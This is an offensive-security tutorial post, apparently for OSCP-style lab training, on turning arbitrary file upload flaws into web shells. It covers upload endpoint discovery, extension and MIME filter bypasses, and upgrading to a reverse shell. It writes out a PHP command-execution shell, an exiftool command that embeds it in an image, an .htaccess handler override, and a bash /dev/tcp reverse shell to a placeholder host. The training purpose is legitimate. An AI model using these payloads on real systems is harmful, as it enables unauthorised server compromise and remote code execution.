### Content of the Day — File Upload → Web Shell (enumeration → exploitation, T1505.003)

Arbitrary file upload is the web equivalent of a free `whoami` — if you can get a `.php`/`.aspx`/`.jsp` into a directory the server will execute, you go straight from "unauthenticated web user" to code execution. It's everywhere in labs and, right now, everywhere in the KEV catalog: the last few weeks alone added JoomShaper SP Page Builder (CVE-2026-48908), Joomlack Page Builder (CVE-2026-56290), iCagenda (CVE-2026-48939), and Balbooa Forms (CVE-2026-56291) — all "Unrestricted Upload of File with Dangerous Type," all exploited in the wild. This is not a museum technique.

**Enumeration first.** Map every place the app takes a file: profile/avatar images, document/CSV import, "attach a file," theme/plugin upload, ticketing. `ffuf`/`gobuster` the app for `upload.php`, `/uploads/`, `/admin`, `import`, `attachments`. Two things decide whether an upload is exploitable: (1) can you influence the stored **extension/content**, and (2) is the upload directory **served and executed** by the handler? Fingerprint the stack (response headers, error pages, existing file extensions) so you know whether you're aiming for `.php`/`.phtml`, `.aspx`, or a `.jsp`. Confirm execution by uploading a benign `<?php phpinfo(); ?>` and requesting it back — if it renders as source, the dir isn't executing PHP and you pivot to another handler trick.

**Then bypass the filter.** Blocklist checks are brittle — try alternate executable extensions (`.phtml`, `.php5`, `.pht`, `.phar`; `.aspx`→`.aspx`/`.ashx`), double extensions (`shell.php.jpg` where only the last is checked, or `shell.jpg.php` where only the first is), and case games (`.pHp`). If it's a content/MIME check, spoof the multipart `Content-Type: image/jpeg` while the body is PHP, or prepend a `GIF89a;` magic-byte header, or stuff the payload into EXIF: `exiftool -Comment='<?php system($_GET["c"]); ?>' cat.jpg`. When you can drop a `.htaccess` (Apache) or `web.config` (IIS), you don't even need a clever extension — upload `AddType application/x-httpd-php .jpg` and now every `.jpg` is code. Burp **Intruder** with a wordlist of extensions/`Content-Type` values automates the whole grid; `fuxploider` will brute the same surface for you.

**Land and upgrade.** Keep the dropped shell minimal (`<?php system($_GET['c']);?>`) or generate a stealthier one with `weevely generate <pass> shell.phtml`, then immediately trade the webshell for a proper reverse shell (`bash -i >& /dev/tcp/<you>/443 0>&1`, or an `msfvenom` payload) and start local enum. **MITRE:** the upload/execute step is **T1505.003 (Server Software Component: Web Shell)**; the endpoint discovery that gets you there is **T1083 / T1595**. **OSCP/lab tie-in:** grind PortSwigger's "File upload vulnerabilities" track for the bypass muscle memory, then hunt it on HTB/PG web boxes — an upload feature plus a writable, executable directory is one of the most common OSCP-exam footholds there is.
